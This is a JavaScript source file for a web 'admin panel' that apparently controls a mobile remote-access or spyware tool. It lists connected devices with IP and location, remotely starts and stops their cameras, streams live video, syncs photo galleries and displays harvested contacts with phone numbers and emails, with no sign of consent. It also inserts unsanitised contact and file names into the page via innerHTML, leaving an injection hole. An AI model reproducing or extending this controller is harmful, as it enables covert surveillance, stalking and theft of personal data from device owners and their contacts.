class AdminPanel {
    constructor() {
        this.ws = null;
        this.clients = new Map();
        this.selectedClientId = null;
        this.videoCanvas = document.getElementById('videoCanvas');
        this.videoContext = this.videoCanvas.getContext('2d');
        this.init();
    }

    init() {
        this.connect();
        this.setupEventListeners();
    }

    connect() {
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = `${protocol}//${window.location.host}/admin-ws`;
        
        this.ws = new WebSocket(wsUrl);
        
        this.ws.onopen = () => {
            console.log('Connected to admin WebSocket');
            this.updateConnectionStatus('Connected', true);
        };
        
        this.ws.onmessage = (event) => {
            const message = JSON.parse(event.data);
            this.handleMessage(message);
        };
        
        this.ws.onclose = () => {
            console.log('Disconnected from admin WebSocket');
            this.updateConnectionStatus('Disconnected', false);
            setTimeout(() => this.connect(), 5000);
        };
        
        this.ws.onerror = (error) => {
            console.error('WebSocket error:', error);
            this.updateConnectionStatus('Error', false);
        };
    }

    updateConnectionStatus(status, isConnected) {
        const statusElement = document.getElementById('connectionStatus');
        const statusDot = document.getElementById('statusDot');
        
        statusElement.textContent = status;
        statusDot.className = `status-dot ${isConnected ? 'connected' : ''}`;
    }

    handleMessage(message) {
        switch (message.type) {
            case 'CLIENTS_LIST':
                this.updateClientsList(message.data);
                break;
            case 'CLIENT_CONNECTED':
                this.addClient(message.data);
                break;
            case 'CLIENT_DISCONNECTED':
                this.removeClient(message.clientId);
                break;
            case 'CONTACTS_UPDATED':
            case 'CONTACTS_RECEIVED':
                this.updateContacts(message.clientId, message.data);
                break;
            case 'IMAGE_UPLOADED':
                this.addImage(message.data);
                break;
            case 'VIDEO_STREAM':
                this.updateVideoStream(message.clientId, message.data);
                break;
            case 'DEVICE_INFO_UPDATED':
                this.updateDeviceInfo(message.clientId, message.data);
                break;
        }
        this.updateStats();
    }

    updateClientsList(clients) {
        this.clients.clear();
        clients.forEach(client => {
            this.clients.set(client.id, client);
        });
        this.renderClients();
        this.updateAllContacts();
        this.updateAllImages();
    }

    addClient(client) {
        this.clients.set(client.id, client);
        this.renderClients();
    }

    removeClient(clientId) {
        this.clients.delete(clientId);
        if (this.selectedClientId === clientId) {
            this.selectedClientId = null;
            this.stopVideoStream();
        }
        this.renderClients();
        this.updateAllContacts();
        this.updateAllImages();
    }

    renderClients() {
        const clientsList = document.getElementById('clientsList');
        const clientCount = document.getElementById('clientCount');
        
        if (this.clients.size === 0) {
            clientsList.innerHTML = '<div class="no-data">No devices connected</div>';
            clientCount.textContent = '0';
            return;
        }

        clientCount.textContent = this.clients.size;
        
        let html = '';
        this.clients.forEach((client, clientId) => {
            const isActive = this.selectedClientId === clientId;
            const connectedTime = this.formatTime(client.connectedAt);
            const deviceModel = client.deviceInfo?.model || 'Unknown Device';
            const deviceOS = client.deviceInfo?.os || 'Unknown OS';
            
            html += `
                <div class="client-item ${isActive ? 'active' : ''}" data-client-id="${clientId}">
                    <div class="client-header">
                        <div class="client-id">${clientId}</div>
                        <div class="client-status">
                            <div class="online-dot"></div>
                            Online
                        </div>
                    </div>
                    <div class="client-info">
                        <div><strong>IP:</strong> ${client.ip}</div>
                        <div><strong>Location:</strong> ${client.location}</div>
                        <div><strong>Device:</strong> ${deviceModel}</div>
                        <div><strong>OS:</strong> ${deviceOS}</div>
                        <div><strong>Connected:</strong> ${connectedTime}</div>
                        <div><strong>Contacts:</strong> ${client.contacts?.length || 0}</div>
                    </div>
                    <div class="controls">
                        <button class="btn btn-primary" onclick="adminPanel.selectClient('${clientId}')">
                            Select
                        </button>
                        <button class="btn btn-success" onclick="adminPanel.startCamera('${clientId}')" 
                                ${client.isStreaming ? 'disabled' : ''}>
                            Start Camera
                        </button>
                        <button class="btn btn-danger" onclick="adminPanel.stopCamera('${clientId}')"
                                ${!client.isStreaming ? 'disabled' : ''}>
                            Stop Camera
                        </button>
                        <button class="btn btn-primary" onclick="adminPanel.syncGallery('${clientId}')">
                            Sync Gallery
                        </button>
                    </div>
                </div>
            `;
        });
        
        clientsList.innerHTML = html;
    }

    selectClient(clientId) {
        this.selectedClientId = clientId;
        this.renderClients();
        
        const client = this.clients.get(clientId);
        if (client) {
            this.updateContacts(clientId, client.contacts || []);
            this.updateClientImages(client);
        }
    }

    startCamera(clientId) {
        this.sendCommand(clientId, 'START_CAMERA');
        const client = this.clients.get(clientId);
        if (client) {
            client.isStreaming = true;
            this.renderClients();
            this.updateVideoStreamStatus(`Streaming from ${clientId}`);
        }
    }

    stopCamera(clientId) {
        this.sendCommand(clientId, 'STOP_CAMERA');
        const client = this.clients.get(clientId);
        if (client) {
            client.isStreaming = false;
            this.renderClients();
        }
        this.stopVideoStream();
    }

    syncGallery(clientId) {
        this.sendCommand(clientId, 'SYNC_GALLERY');
    }

    sendCommand(clientId, type) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify({
                type: type,
                clientId: clientId
            }));
        }
    }

    updateContacts(clientId, contacts) {
        if (this.selectedClientId !== clientId && clientId) return;
        
        const contactsList = document.getElementById('contactsList');
        const contactsCount = document.getElementById('contactsCount');
        
        if (!contacts || contacts.length === 0) {
            contactsList.innerHTML = '<div class="no-data">No contacts available</div>';
            contactsCount.textContent = '0';
            return;
        }

        contactsCount.textContent = contacts.length;
        
        let html = '<div class="contacts-list">';
        contacts.forEach(contact => {
            html += `
                <div class="contact-item">
                    <div class="contact-name">${contact.name || 'Unknown'}</div>
                    <div class="contact-details">
                        ${contact.phoneNumber ? `📱 ${contact.phoneNumber}` : ''}
                        ${contact.email ? `📧 ${contact.email}` : ''}
                    </div>
                </div>
            `;
        });
        html += '</div>';
        
        contactsList.innerHTML = html;
    }

    updateAllContacts() {
        let totalContacts = 0;
        this.clients.forEach(client => {
            totalContacts += client.contacts?.length || 0;
        });
        
        if (this.selectedClientId) {
            const selectedClient = this.clients.get(this.selectedClientId);
            if (selectedClient) {
                this.updateContacts(this.selectedClientId, selectedClient.contacts);
            }
        } else {
            // Show all contacts if no client selected
            let allContacts = [];
            this.clients.forEach(client => {
                if (client.contacts) {
                    allContacts = allContacts.concat(client.contacts);
                }
            });
            this.updateContacts(null, allContacts);
        }
    }

    addImage(data) {
        // Refresh images for the client
        this.updateAllImages();
    }

    updateClientImages(client) {
        const imagesList = document.getElementById('imagesList');
        const imagesCount = document.getElementById('imagesCount');
        
        if (!client.images || client.images.length === 0) {
            imagesList.innerHTML = '<div class="no-data">No images available</div>';
            imagesCount.textContent = '0';
            return;
        }

        imagesCount.textContent = client.images.length;
        
        let html = '';
        client.images.forEach(imageName => {
            html += `
                <div class="image-item" onclick="adminPanel.viewImage('${imageName}')">
                    <img src="/uploads/${imageName}" alt="${imageName}" 
                         onerror="this.src='data:image/svg+xml,<svg xmlns=\\"http://www.w3.org/2000/svg\\" width=\\"150\\" height=\\"120\\"><rect width=\\"100%\\" height=\\"100%\\" fill=\\"#f0f0f0\\"/><text x=\\"50%\\" y=\\"50%\\" text-anchor=\\"middle\\" dy=\\".3em\\" fill=\\"#999\\">No Image</text></svg>'">
                    <div class="image-overlay">
                        ${imageName}
                    </div>
                </div>
            `;
        });
        
        imagesList.innerHTML = html;
    }

    updateAllImages() {
        let totalImages = 0;
        this.clients.forEach(client => {
            totalImages += client.images?.length || 0;
        });
        
        if (this.selectedClientId) {
            const selectedClient = this.clients.get(this.selectedClientId);
            if (selectedClient) {
                this.updateClientImages(selectedClient);
            }
        } else {
            // Show all images if no client selected
            const imagesList = document.getElementById('imagesList');
            const imagesCount = document.getElementById('imagesCount');
            
            if (totalImages === 0) {
                imagesList.innerHTML = '<div class="no-data">No images available</div>';
                imagesCount.textContent = '0';
                return;
            }

            imagesCount.textContent = totalImages;
            
            let html = '';
            this.clients.forEach(client => {
                if (client.images) {
                    client.images.forEach(imageName => {
                        html += `
                            <div class="image-item" onclick="adminPanel.viewImage('${imageName}')">
                                <img src="/uploads/${imageName}" alt="${imageName}"
                                     onerror="this.src='data:image/svg+xml,<svg xmlns=\\"http://www.w3.org/2000/svg\\" width=\\"150\\" height=\\"120\\"><rect width=\\"100%\\" height=\\"100%\\" fill=\\"#f0f0f0\\"/><text x=\\"50%\\" y=\\"50%\\" text-anchor=\\"middle\\" dy=\\".3em\\" fill=\\"#999\\">No Image</text></svg>'">
                                <div class="image-overlay">
                                    ${imageName} (${client.id})
                                </div>
                            </div>
                        `;
                    });
                }
            });
            
            imagesList.innerHTML = html;
        }
    }

    viewImage(imageName) {
        window.open(`/uploads/${imageName}`, '_blank');
    }

    updateVideoStream(clientId, base64Data) {
        if (!this.selectedClientId || this.selectedClientId !== clientId) return;
        
        const img = new Image();
        img.onload = () => {
            this.videoCanvas.width = img.width;
            this.videoCanvas.height = img.height;
            this.videoContext.drawImage(img, 0, 0);
            
            document.querySelector('.no-video').style.display = 'none';
            this.videoCanvas.style.display = 'block';
        };
        img.src = 'data:image/jpeg;base64,' + base64Data;
        
        this.updateVideoStreamStatus(`Live from ${clientId}`);
    }

    stopVideoStream() {
        this.videoCanvas.style.display = 'none';
        document.querySelector('.no-video').style.display = 'block';
        this.updateVideoStreamStatus('No active stream');
    }

    updateVideoStreamStatus(status) {
        document.getElementById('streamStatus').textContent = status;
    }

    updateDeviceInfo(clientId, deviceInfo) {
        const client = this.clients.get(clientId);
        if (client) {
            client.deviceInfo = deviceInfo;
            this.renderClients();
        }
    }

    updateStats() {
        let activeStreams = 0;
        let totalContacts = 0;
        let totalImages = 0;
        
        this.clients.forEach(client => {
            if (client.isStreaming) activeStreams++;
            totalContacts += client.contacts?.length || 0;
            totalImages += client.images?.length || 0;
        });
        
        document.getElementById('totalClients').textContent = this.clients.size;
        document.getElementById('totalContacts').textContent = totalContacts;
        document.getElementById('totalImages').textContent = totalImages;
        document.getElementById('activeStreams').textContent = activeStreams;
    }

    formatTime(timestamp) {
        if (!timestamp) return 'Unknown';
        const date = new Date(timestamp);
        return date.toLocaleTimeString();
    }

    setupEventListeners() {
        // Handle client selection clicks
        document.addEventListener('click', (e) => {
            if (e.target.closest('.client-item') && !e.target.closest('.controls')) {
                const clientId = e.target.closest('.client-item').dataset.clientId;
                this.selectClient(clientId);
            }
        });
    }
}

// Initialize admin panel when page loads
let adminPanel;
document.addEventListener('DOMContentLoaded', () => {
    adminPanel = new AdminPanel();
});
